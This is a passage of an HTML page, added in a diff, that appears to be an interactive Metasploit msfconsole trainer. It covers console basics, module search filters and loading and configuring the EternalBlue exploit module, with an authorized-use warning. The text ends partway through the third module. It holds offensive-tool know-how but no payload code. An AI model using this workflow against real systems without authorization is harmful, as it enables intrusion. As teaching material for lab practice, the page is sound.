@@ -1,0 +1,2059 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FRAMEWORK // Metasploit msfconsole Trainer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Major+Mono+Display&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0a0e0a; --bg-2:#0e1410; --panel:#0f1612; --panel-2:#131c17;
+    --border:#1f2d24; --green:#00ff88; --green-dim:#0a8856;
+    --green-glow:rgba(0,255,136,.35); --amber:#ffb454; --red:#ff5b5b;
+    --cyan:#5be0ff; --magenta:#ff5bd0;
+    --text:#cfe9d8; --text-dim:#7da896; --text-faint:#3d5b4d;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;}
+  body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--text);overflow-x:hidden;
+    background-image:
+      radial-gradient(ellipse at 20% 0%, rgba(0,255,136,.06), transparent 50%),
+      radial-gradient(ellipse at 80% 100%, rgba(91,224,255,.04), transparent 50%),
+      linear-gradient(rgba(0,255,136,.015) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,.015) 1px, transparent 1px);
+    background-size: auto, auto, 32px 32px, 32px 32px;}
+  body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,.12) 0,rgba(0,0,0,.12) 1px,transparent 1px,transparent 3px);
+    mix-blend-mode:multiply;opacity:.4;}
+  body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9998;
+    background:radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,.5) 100%);}
+  ::selection{background:var(--green);color:#000}
+  ::-webkit-scrollbar{width:10px;height:10px}
+  ::-webkit-scrollbar-track{background:var(--bg-2)}
+  ::-webkit-scrollbar-thumb{background:var(--green-dim);border-radius:0}
+  ::-webkit-scrollbar-thumb:hover{background:var(--green)}
+  .app{display:grid;grid-template-columns:300px 1fr;min-height:100vh;}
+  aside{background:var(--panel);border-right:1px solid var(--border);padding:20px 16px;position:sticky;top:0;height:100vh;overflow-y:auto;}
+  main{padding:30px 40px 80px;max-width:1100px;}
+  .logo{font-family:'Major Mono Display',monospace;color:var(--green);font-size:16px;line-height:1.2;text-shadow:0 0 12px var(--green-glow);margin-bottom:4px;letter-spacing:1px;}
+  .logo-sub{font-size:10px;color:var(--text-dim);margin-bottom:18px;letter-spacing:2px;text-transform:uppercase}
+  .sec-title{font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:2px;margin:18px 0 8px;border-bottom:1px solid var(--border);padding-bottom:6px;}
+  .nav-item{display:block;padding:8px 10px;cursor:pointer;border-left:2px solid transparent;color:var(--text-dim);font-size:12px;transition:all .15s;text-decoration:none;margin-bottom:2px;}
+  .nav-item:hover{color:var(--green);background:rgba(0,255,136,.05);border-left-color:var(--green-dim)}
+  .nav-item.active{color:var(--green);background:rgba(0,255,136,.08);border-left-color:var(--green)}
+  .nav-num{color:var(--text-faint);margin-right:8px;font-weight:700}
+  .nav-prog{height:3px;background:var(--border);margin-top:4px;overflow:hidden;}
+  .nav-prog-fill{height:100%;background:var(--green);transition:width .3s;box-shadow:0 0 6px var(--green-glow)}
+  .nav-prog-text{font-size:9px;color:var(--text-faint);margin-top:2px}
+  .stat-row{display:flex;justify-content:space-between;font-size:11px;margin:6px 0}
+  .stat-row span:first-child{color:var(--text-dim)}
+  .stat-row span:last-child{color:var(--green);font-weight:700}
+  .btn{display:block;width:100%;padding:8px 10px;background:transparent;color:var(--green);border:1px solid var(--green-dim);font-family:inherit;font-size:11px;cursor:pointer;text-transform:uppercase;letter-spacing:1px;margin-top:6px;transition:all .15s;}
+  .btn:hover{background:var(--green);color:#000;box-shadow:0 0 16px var(--green-glow)}
+  .btn.danger{color:var(--red);border-color:#5b2222}
+  .btn.danger:hover{background:var(--red);color:#000;box-shadow:0 0 16px rgba(255,91,91,.4)}
+  h1{font-family:'Major Mono Display',monospace;color:var(--green);font-size:28px;letter-spacing:2px;text-shadow:0 0 16px var(--green-glow);margin-bottom:6px;}
+  h2{color:var(--green);font-size:20px;margin:36px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:baseline;gap:12px;}
+  h2 .num{color:var(--text-faint);font-family:'Major Mono Display',monospace;font-size:14px}
+  h3{color:var(--cyan);font-size:14px;margin:18px 0 8px;text-transform:uppercase;letter-spacing:1px}
+  h4{color:var(--amber);font-size:13px;margin:14px 0 6px}
+  p{margin:8px 0;line-height:1.65;color:var(--text);font-size:13px}
+  p.lead{color:var(--text-dim);font-style:italic;font-size:12px;margin-bottom:14px}
+  strong{color:var(--green)}
+  em{color:var(--amber);font-style:normal}
+  code{background:var(--bg-2);color:var(--cyan);padding:1px 6px;border-radius:2px;font-size:12px;border:1px solid var(--border);}
+  ul,ol{margin:8px 0 12px 22px}
+  li{margin:4px 0;color:var(--text);font-size:13px;line-height:1.55}
+  hr{border:0;border-top:1px solid var(--border);margin:24px 0}
+  .tagline{color:var(--text-dim);font-size:12px;margin-bottom:20px;padding-bottom:18px;border-bottom:1px solid var(--border)}
+  .concept{background:linear-gradient(135deg, rgba(91,224,255,.04), rgba(0,255,136,.03));border:1px solid var(--border);border-left:3px solid var(--cyan);padding:14px 18px;margin:14px 0;}
+  .concept .label{color:var(--cyan);font-size:10px;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;font-weight:700;}
+  .concept p{margin:6px 0;font-size:12px}
+  .why{background:rgba(255,180,84,.04);border-left:3px solid var(--amber);padding:10px 14px;margin:10px 0;}
+  .why .label{color:var(--amber);font-size:10px;letter-spacing:2px;text-transform:uppercase;margin-bottom:4px;font-weight:700;}
+  .why p{margin:4px 0;font-size:12px}
+  .anatomy{background:var(--panel);border:1px solid var(--border);margin:14px 0;overflow-x:auto;}
+  .anatomy table{width:100%;border-collapse:collapse;font-size:12px}
+  .anatomy th{background:var(--panel-2);color:var(--green);text-align:left;padding:8px 12px;border-bottom:1px solid var(--border);font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:1px;}
+  .anatomy td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+  .anatomy tr:last-child td{border-bottom:none}
+  .anatomy code{background:var(--bg-2);color:var(--amber);font-size:11px;white-space:nowrap}
+  .anatomy td:first-child{width:38%;color:var(--text-dim)}
+  .terminal{background:#000;border:1px solid var(--border);box-shadow:0 0 0 1px rgba(0,255,136,.05), inset 0 0 60px rgba(0,255,136,.02);margin:14px 0;font-family:'JetBrains Mono',monospace;font-size:12px;position:relative;overflow:hidden;}
+  .term-bar{background:var(--panel-2);border-bottom:1px solid var(--border);padding:6px 14px;display:flex;align-items:center;gap:8px;font-size:10px;}
+  .term-dots{display:flex;gap:5px}
+  .term-dots span{width:9px;height:9px;border-radius:50%}
+  .term-dots span:nth-child(1){background:#ff5b5b}
+  .term-dots span:nth-child(2){background:#ffb454}
+  .term-dots span:nth-child(3){background:#5bff8d}
+  .term-title{color:var(--text-dim);margin-left:6px;letter-spacing:1px;text-transform:uppercase;font-size:10px}
+  .term-body{padding:14px 16px;min-height:80px;max-height:480px;overflow-y:auto;color:#bce6cf;line-height:1.5}
+  .term-body pre{font-family:inherit;white-space:pre-wrap;word-break:break-word}
+  .term-prompt{color:var(--text-dim)}
+  .term-host{color:var(--green);font-weight:700}
+  .term-path{color:var(--cyan)}
+  .term-msf{color:var(--red);font-weight:700;text-shadow:0 0 6px rgba(255,91,91,.3)}
+  .term-msf-mod{color:var(--amber)}
+  .term-meter{color:var(--magenta);font-weight:700;text-shadow:0 0 6px rgba(255,91,208,.3)}
+  .term-cmd{color:#fff;font-weight:500}
+  .term-info{color:var(--cyan)}
+  .term-ok{color:var(--green)}
+  .term-warn{color:var(--amber)}
+  .term-err{color:var(--red)}
+  .term-dim{color:var(--text-faint)}
+  .term-hdr{color:var(--green);font-weight:700;text-decoration:underline}
+  .blink{animation:blink 1s infinite}
+  @keyframes blink{50%{opacity:0}}
+  .term-input-row{display:flex;align-items:center;border-top:1px solid var(--border);padding:8px 14px;background:rgba(0,255,136,.02);}
+  .term-input-prefix{color:var(--red);font-weight:700;margin-right:8px;white-space:nowrap}
+  .term-input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-family:inherit;font-size:12px;caret-color:var(--green);}
+  .challenge{background:var(--panel);border:1px solid var(--border);border-left:3px solid var(--green-dim);padding:18px;margin:18px 0;position:relative;}
+  .challenge.solved{border-left-color:var(--green);box-shadow:0 0 0 1px rgba(0,255,136,.15)}
+  .ch-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:8px}
+  .ch-title{color:var(--green);font-size:13px;text-transform:uppercase;letter-spacing:1px;font-weight:700}
+  .ch-status{font-size:10px;padding:2px 10px;border:1px solid var(--green-dim);color:var(--green-dim);text-transform:uppercase;letter-spacing:1px;}
+  .ch-status.solved{background:var(--green);color:#000;border-color:var(--green)}
+  .ch-task{font-size:13px;color:var(--text);margin:8px 0 6px;line-height:1.6}
+  .ch-task .target{color:var(--cyan);font-weight:700}
+  .ch-scenario{background:var(--bg-2);border:1px dashed var(--border);padding:10px 12px;font-size:12px;color:var(--text-dim);margin:8px 0;}
+  .hint-row{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
+  .hint-btn{padding:5px 12px;background:transparent;color:var(--amber);border:1px solid #5b4a22;font-family:inherit;font-size:11px;cursor:pointer;text-transform:uppercase;letter-spacing:1px;}
+  .hint-btn:hover{background:var(--amber);color:#000}
+  .hint-box{background:rgba(255,180,84,.05);border-left:2px solid var(--amber);padding:8px 12px;margin-top:8px;font-size:12px;color:var(--amber);display:none;}
+  .hint-box.show{display:block}
+  .toast{position:fixed;bottom:24px;right:24px;background:var(--panel);border:1px solid var(--green);color:var(--green);padding:12px 18px;font-size:12px;letter-spacing:1px;text-transform:uppercase;box-shadow:0 0 24px var(--green-glow);transform:translateY(120%);transition:transform .3s;z-index:10000;}
+  .toast.show{transform:translateY(0)}
+  .modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:10001;padding:20px;}
+  .modal-bg.show{display:flex}
+  .modal{background:var(--panel);border:1px solid var(--green);padding:24px;max-width:560px;width:100%;box-shadow:0 0 40px var(--green-glow);}
+  .modal h3{margin-top:0}
+  .modal textarea{width:100%;height:140px;background:#000;color:var(--green);border:1px solid var(--border);font-family:inherit;font-size:11px;padding:10px;resize:vertical;margin:10px 0;}
+  .modal-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+  .modal-actions .btn{flex:1;margin:0;min-width:120px}
+  @media (max-width: 880px){
+    .app{grid-template-columns:1fr}
+    aside{position:static;height:auto;border-right:none;border-bottom:1px solid var(--border)}
+    main{padding:20px 16px 60px}
+    h1{font-size:22px}
+    h2{font-size:16px}
+    .anatomy{font-size:11px}
+    .anatomy td{padding:6px 8px}
+  }
+</style>
+</head>
+<body>
+<div class="app">
+  <aside>
+    <div class="logo">framework</div>
+    <div class="logo-sub">// msfconsole trainer</div>
+    <div class="sec-title">Modules</div>
+    <a class="nav-item" href="#mod-1"><span class="nav-num">01</span>Welcome to msfconsole</a>
+    <div class="nav-prog"><div class="nav-prog-fill" id="prog-1" style="width:0%"></div></div>
+    <div class="nav-prog-text" id="progt-1">0 / 3</div>
+    <a class="nav-item" href="#mod-2"><span class="nav-num">02</span>Searching the arsenal</a>
+    <div class="nav-prog"><div class="nav-prog-fill" id="prog-2" style="width:0%"></div></div>
+    <div class="nav-prog-text" id="progt-2">0 / 3</div>
+    <a class="nav-item" href="#mod-3"><span class="nav-num">03</span>Anatomy of a module</a>
+    <div class="nav-prog"><div class="nav-prog-fill" id="prog-3" style="width:0%"></div></div>
+    <div class="nav-prog-text" id="progt-3">0 / 4</div>
+    <a class="nav-item" href="#mod-4"><span class="nav-num">04</span>Payloads explained</a>
+    <div class="nav-prog"><div class="nav-prog-fill" id="prog-4" style="width:0%"></div></div>
+    <div class="nav-prog-text" id="progt-4">0 / 3</div>
+    <a class="nav-item" href="#mod-5"><span class="nav-num">05</span>Firing the exploit</a>
+    <div class="nav-prog"><div class="nav-prog-fill" id="prog-5" style="width:0%"></div></div>
+    <div class="nav-prog-text" id="progt-5">0 / 3</div>
+    <a class="nav-item" href="#mod-6"><span class="nav-num">06</span>Meterpreter post-ex</a>
+    <div class="nav-prog"><div class="nav-prog-fill" id="prog-6" style="width:0%"></div></div>
+    <div class="nav-prog-text" id="progt-6">0 / 4</div>
+    <a class="nav-item" href="#mod-7"><span class="nav-num">07</span>Database & workspaces</a>
+    <div class="nav-prog"><div class="nav-prog-fill" id="prog-7" style="width:0%"></div></div>
+    <div class="nav-prog-text" id="progt-7">0 / 3</div>
+    <a class="nav-item" href="#mod-8"><span class="nav-num">08</span>Auxiliary scanners</a>
+    <div class="nav-prog"><div class="nav-prog-fill" id="prog-8" style="width:0%"></div></div>
+    <div class="nav-prog-text" id="progt-8">0 / 3</div>
+    <div class="sec-title">Stats</div>
+    <div class="stat-row"><span>Challenges</span><span id="stat-done">0 / 26</span></div>
+    <div class="stat-row"><span>Hints used</span><span id="stat-hints">0</span></div>
+    <div class="stat-row"><span>Overall</span><span id="stat-pct">0%</span></div>
+    <div class="sec-title">Save</div>
+    <button class="btn" onclick="exportState()">Export progress</button>
+    <button class="btn" onclick="showImport()">Import progress</button>
+    <button class="btn danger" onclick="resetAll()">Reset all</button>
+  </aside>
+  <main>
+    <h1>FRAMEWORK</h1>
+    <p class="tagline">// interactive metasploit msfconsole trainer — learn the workflow, not just the syntax</p>
+    <p class="lead">This trainer simulates msfconsole. Every command you'd type at a real prompt, you can type here. The simulator reads your input, validates it, and prints back realistic output — including how things go wrong when you forget a flag or mistype a target. Each command is explained: what it does, why it exists, and where it fits in a real engagement.</p>
+    <div class="concept">
+      <div class="label">⚠ Authorized use only</div>
+      <p>Metasploit is for security research, CTFs, lab work, and engagements you have written permission for. Pointing it at machines you don't own or have authorization to test is illegal in most jurisdictions. The targets in this trainer are fictional. Practice on Hack The Box, TryHackMe, your own VMs, or your employer's authorized scope.</p>
+    </div>
+    <div class="concept">
+      <div class="label">→ How to use this trainer</div>
+      <p>Read each module's brief and command anatomy. Watch the demo run — you can replay it. Then attempt each challenge by typing into the live terminal. The terminal accepts <code>help</code> and <code>clear</code> as builtins. Use ↑/↓ to recall previous commands. If stuck, the hints reveal progressively more of the answer. Your progress saves automatically.</p>
+    </div>
+
+    <h2 id="mod-1"><span class="num">01</span>Welcome to msfconsole</h2>
+    <p class="lead">// what metasploit is, how to launch it, how to find your way around</p>
+    <p><strong>Metasploit Framework</strong> is the world's most-used exploitation toolkit. Think of it as a giant library of pre-built attacks — exploits, scanners, payloads, post-exploitation modules — wrapped in a command-line shell called <strong>msfconsole</strong>. Instead of writing custom code for every CVE, you load a module, set a few options, and fire.</p>
+    <p>Metasploit ships in Kali by default. The console is interactive — when you launch it, you get a prompt that looks like <code>msf6 ></code>, and from there you navigate by typing commands.</p>
+    <div class="concept">
+      <div class="label">→ Mental model</div>
+      <p>msfconsole is like a kitchen. The pantry has thousands of ingredients (modules). The countertop is your active workspace. You go grab one ingredient (<code>use</code> a module), prep it (<code>set</code> options), and serve it (<code>run</code> or <code>exploit</code>). When you're done, you put it back (<code>back</code>) and grab the next.</p>
+    </div>
+    <h3>Command anatomy — the navigation basics</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>msfconsole</code></td><td>Launches the framework console (run from your bash shell)</td></tr>
+        <tr><td><code>help</code> or <code>?</code></td><td>Lists every console command, grouped by category</td></tr>
+        <tr><td><code>help &lt;cmd&gt;</code></td><td>Detailed help on one command. <code>help search</code> shows search filters.</td></tr>
+        <tr><td><code>version</code></td><td>Prints framework + console version. Useful when reporting bugs or checking module compatibility.</td></tr>
+        <tr><td><code>banner</code></td><td>Reprints the ASCII-art startup banner. Cosmetic, but rotates through several designs — try it twice.</td></tr>
+        <tr><td><code>history</code></td><td>Shows previous commands you've run this session</td></tr>
+        <tr><td><code>exit</code> or <code>quit</code></td><td>Leaves msfconsole and returns to your shell</td></tr>
+      </tbody>
+    </table></div>
+    <div class="why">
+      <div class="label">Why this matters</div>
+      <p>Every module you'll ever use lives behind these basic navigation commands. If you can't get help, can't see options, can't get back out — you can't work the framework. Master these first; everything else is just more specific versions.</p>
+    </div>
+    <h3>Demo run</h3>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:6px">Watch a typical session start: launching the console, checking the version, asking for help.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">demo · launch sequence</div></div>
+      <div class="term-body" id="demo-1"></div>
+    </div>
+    <button class="btn" style="max-width:200px" onclick="runDemo('demo-1', demos.d1)">▶ Replay demo</button>
+    <h3>Challenges</h3>
+
+    <div class="challenge" id="ch-1-1">
+      <div class="ch-head"><div class="ch-title">CH 1.1 — Launch the console</div><div class="ch-status" id="st-1-1">unsolved</div></div>
+      <div class="ch-task">From your bash prompt, launch Metasploit Framework's interactive console.</div>
+      <div class="ch-scenario">You've just sat down at a Kali box. You need to start working with Metasploit. What command do you type?</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">bash · /home/kali</div></div>
+        <div class="term-body" id="t-1-1"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-1-1">└─$</span><input class="term-input" id="i-1-1" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('1-1',1)">Hint 1</button><button class="hint-btn" onclick="hint('1-1',2)">Hint 2</button><button class="hint-btn" onclick="hint('1-1',3)">Reveal</button></div>
+      <div class="hint-box" id="h-1-1"></div>
+    </div>
+
+    <div class="challenge" id="ch-1-2">
+      <div class="ch-head"><div class="ch-title">CH 1.2 — Check the framework version</div><div class="ch-status" id="st-1-2">unsolved</div></div>
+      <div class="ch-task">You're inside msfconsole now. A bug report you're filing needs the exact framework version. Print it.</div>
+      <div class="ch-scenario">The prompt has changed from <code>└─$</code> to <code>msf6 ></code> — that's how you know you're inside the framework.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-1-2"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-1-2"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-1-2" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('1-2',1)">Hint 1</button><button class="hint-btn" onclick="hint('1-2',2)">Hint 2</button><button class="hint-btn" onclick="hint('1-2',3)">Reveal</button></div>
+      <div class="hint-box" id="h-1-2"></div>
+    </div>
+
+    <div class="challenge" id="ch-1-3">
+      <div class="ch-head"><div class="ch-title">CH 1.3 — Find help on the search command</div><div class="ch-status" id="st-1-3">unsolved</div></div>
+      <div class="ch-task">You want to learn what filters the <code>search</code> command accepts. Print its detailed help inside msfconsole.</div>
+      <div class="ch-scenario">Generic <code>help</code> dumps every command — too much. Pinpoint help for one command is faster.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-1-3"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-1-3"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-1-3" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('1-3',1)">Hint 1</button><button class="hint-btn" onclick="hint('1-3',2)">Hint 2</button><button class="hint-btn" onclick="hint('1-3',3)">Reveal</button></div>
+      <div class="hint-box" id="h-1-3"></div>
+    </div>
+
+    <h2 id="mod-2"><span class="num">02</span>Searching the arsenal</h2>
+    <p class="lead">// finding the right module among thousands</p>
+    <p>Metasploit ships with <strong>2,300+ exploits</strong>, hundreds of payloads, scanners, and post-exploitation modules. The <code>search</code> command is how you find the one you need. It accepts a free-text query, but the real power is in the <strong>filters</strong> — keyword:value pairs that narrow results dramatically.</p>
+    <div class="concept">
+      <div class="label">→ Module path naming</div>
+      <p>Modules have paths like <code>exploit/windows/smb/ms17_010_eternalblue</code>. Read it left-to-right: <em>category</em> / <em>platform</em> / <em>service</em> / <em>name</em>. That structure is what the filters target. <code>type:exploit</code> hits the first segment, <code>platform:windows</code> hits the second, and so on.</p>
+    </div>
+    <h3>Command anatomy — search filters</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Filter</th><th>Purpose</th></tr></thead>
+      <tbody>
+        <tr><td><code>search &lt;term&gt;</code></td><td>Free-text query against name and description. <code>search eternalblue</code> finds anything mentioning EternalBlue.</td></tr>
+        <tr><td><code>type:exploit</code></td><td>Restrict to exploits. Other values: <em>auxiliary, post, payload, encoder, nop, evasion</em></td></tr>
+        <tr><td><code>platform:windows</code></td><td>Restrict to a target platform. Values: <em>windows, linux, unix, osx, android, php, python, java, multi</em></td></tr>
+        <tr><td><code>cve:2017-0144</code></td><td>Match a specific CVE identifier. Year-only also works: <code>cve:2017</code></td></tr>
+        <tr><td><code>name:smb</code></td><td>Substring match against the module name only (not description)</td></tr>
+        <tr><td><code>rank:excellent</code></td><td>Filter by exploit reliability. Worst→best: <em>manual, low, average, normal, good, great, excellent</em></td></tr>
+        <tr><td><code>app:client</code></td><td>Client-side (user must open something) vs <code>app:server</code> (remote, no interaction)</td></tr>
+        <tr><td>combine them</td><td><code>search type:exploit platform:windows smb</code> — filters AND together</td></tr>
+      </tbody>
+    </table></div>
+    <div class="why">
+      <div class="label">Why this matters</div>
+      <p>Without filters, <code>search smb</code> returns 80+ results. With <code>type:exploit platform:windows smb</code>, you're down to maybe 25 — all relevant. In a time-boxed engagement, the difference between scrolling output and finding-what-you-need is fluency with these filters.</p>
+    </div>
+    <h3>Demo run</h3>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:6px">Searching for EternalBlue three different ways — by name, by CVE, by combined filter.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">demo · search workflow</div></div>
+      <div class="term-body" id="demo-2"></div>
+    </div>
+    <button class="btn" style="max-width:200px" onclick="runDemo('demo-2', demos.d2)">▶ Replay demo</button>
+    <h3>Challenges</h3>
+
+    <div class="challenge" id="ch-2-1">
+      <div class="ch-head"><div class="ch-title">CH 2.1 — Find EternalBlue by name</div><div class="ch-status" id="st-2-1">unsolved</div></div>
+      <div class="ch-task">A pentest report mentions a target is vulnerable to MS17-010 EternalBlue. Search for the module by its name.</div>
+      <div class="ch-scenario">You don't remember the exact module path yet. Free-text search is the right starting move.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-2-1"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-2-1"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-2-1" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('2-1',1)">Hint 1</button><button class="hint-btn" onclick="hint('2-1',2)">Hint 2</button><button class="hint-btn" onclick="hint('2-1',3)">Reveal</button></div>
+      <div class="hint-box" id="h-2-1"></div>
+    </div>
+
+    <div class="challenge" id="ch-2-2">
+      <div class="ch-head"><div class="ch-title">CH 2.2 — Find by CVE identifier</div><div class="ch-status" id="st-2-2">unsolved</div></div>
+      <div class="ch-task">Your vulnerability report cites <span class="target">CVE-2017-0144</span>. Find every Metasploit module that targets that exact CVE.</div>
+      <div class="ch-scenario">CVE-based searching is more precise than name-based — vendors disagree on names but CVEs are unique.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-2-2"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-2-2"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-2-2" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('2-2',1)">Hint 1</button><button class="hint-btn" onclick="hint('2-2',2)">Hint 2</button><button class="hint-btn" onclick="hint('2-2',3)">Reveal</button></div>
+      <div class="hint-box" id="h-2-2"></div>
+    </div>
+
+    <div class="challenge" id="ch-2-3">
+      <div class="ch-head"><div class="ch-title">CH 2.3 — Filter by type and platform</div><div class="ch-status" id="st-2-3">unsolved</div></div>
+      <div class="ch-task">Find all <span class="target">exploits</span> targeting <span class="target">Windows</span> SMB. Use type and platform filters together so the result list is short and relevant.</div>
+      <div class="ch-scenario">Plain <code>search smb</code> would also dump scanners, post-modules, and Linux Samba bugs — none of which are what you want right now.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-2-3"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-2-3"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-2-3" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('2-3',1)">Hint 1</button><button class="hint-btn" onclick="hint('2-3',2)">Hint 2</button><button class="hint-btn" onclick="hint('2-3',3)">Reveal</button></div>
+      <div class="hint-box" id="h-2-3"></div>
+    </div>
+
+    <h2 id="mod-3"><span class="num">03</span>Anatomy of a module</h2>
+    <p class="lead">// the use → info → show options → set workflow that runs everything</p>
+    <p>Once you've found a module, working with it is always the same four-step dance: <strong>use</strong> it, <strong>info</strong> it, <strong>show options</strong> on it, then <strong>set</strong> what's required. This loop is the same for an exploit, a scanner, a post-module, anything. Once you internalize it, the framework gets dramatically smaller.</p>
+    <div class="concept">
+      <div class="label">→ The four-step loop</div>
+      <p><strong>1. use</strong> — load the module into your active workspace. The prompt changes to show what's loaded.<br><strong>2. info</strong> — read the module's documentation: what it does, refs, targets, options.<br><strong>3. show options</strong> — list every parameter, what it's currently set to, and which are required.<br><strong>4. set</strong> — assign values to required options, primarily <code>RHOSTS</code> (the target).</p>
+    </div>
+    <h3>Command anatomy — module workflow</h3>
+    <div class="anatomy"><table>
+      <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+      <tbody>
+        <tr><td><code>use &lt;module-path&gt;</code></td><td>Loads the module. Prompt becomes <code>msf6 exploit(...) &gt;</code> showing what's active. Tab-completion works on paths.</td></tr>
+        <tr><td><code>use &lt;number&gt;</code></td><td>After a search, you can use the result number directly: <code>use 0</code> picks the first result.</td></tr>
+        <tr><td><code>info</code></td><td>Full description, references (CVE, BID, MSB), authors, supported targets. Read this before firing.</td></tr>
+        <tr><td><code>show options</code></td><td>Three-column table: Name, Current Setting, Required, Description. Required options must be set or the module won't run.</td></tr>
+        <tr><td><code>show targets</code></td><td>Lists target OS/version variants. Some exploits work on Win7 but not Win10 — pick the right one.</td></tr>
+        <tr><td><code>show payloads</code></td><td>Lists payloads compatible with the loaded exploit. Filtered automatically.</td></tr>
+        <tr><td><code>set OPT value</code></td><td>Assign a value to an option. Case-insensitive on the option name. <code>set RHOSTS 10.10.10.5</code>.</td></tr>
+        <tr><td><code>setg OPT value</code></td><td>Set globally — applies to every module loaded this session. Useful for <code>LHOST</code> when your IP doesn't change.</td></tr>
+        <tr><td><code>unset OPT</code></td><td>Clear a value. <code>unset RHOSTS</code>. Use <code>unset all</code> to clear everything.</td></tr>
+        <tr><td><code>back</code></td><td>Unload the current module — prompt returns to <code>msf6 ></code>. Doesn't lose your sets if you re-use the same module.</td></tr>
+      </tbody>
+    </table></div>
+    <div class="why">
+      <div class="label">Why this matters</div>
+      <p>Newcomers skip <code>info</code> and jump to <code>exploit</code> — which crashes loudly because they didn't notice the module needs three required options, not one. The four-step loop isn't bureaucracy; it's the difference between knowing what your tool will do versus throwing packets at a target hoping for the best.</p>
+    </div>
+    <h3>Demo run</h3>
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:6px">Loading EternalBlue, reading its info, viewing options, setting the target.</p>
+    <div class="terminal">
+      <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">demo · module workflow</div></div>
+      <div class="term-body" id="demo-3"></div>
+    </div>
+    <button class="btn" style="max-width:200px" onclick="runDemo('demo-3', demos.d3)">▶ Replay demo</button>
+    <h3>Challenges</h3>
+
+    <div class="challenge" id="ch-3-1">
+      <div class="ch-head"><div class="ch-title">CH 3.1 — Load the EternalBlue module</div><div class="ch-status" id="st-3-1">unsolved</div></div>
+      <div class="ch-task">Load <span class="target">exploit/windows/smb/ms17_010_eternalblue</span> into your active workspace.</div>
+      <div class="ch-scenario">Your search has already found it. Now load it.</div>
+      <div class="terminal">
+        <div class="term-bar"><div class="term-dots"><span></span><span></span><span></span></div><div class="term-title">msfconsole</div></div>
+        <div class="term-body" id="t-3-1"></div>
+        <div class="term-input-row"><span class="term-input-prefix" id="p-3-1"><span class="term-msf">msf6</span> &gt;</span><input class="term-input" id="i-3-1" placeholder="type a command..." autocomplete="off"></div>
+      </div>
+      <div class="hint-row"><button class="hint-btn" onclick="hint('3-1',1)">Hint 1</button><button class="hint-btn" onclick="hint('3-1',2)">Hint 2</button><button class="hint-btn" onclick="hint('3-1',3)">Reveal</button></div>
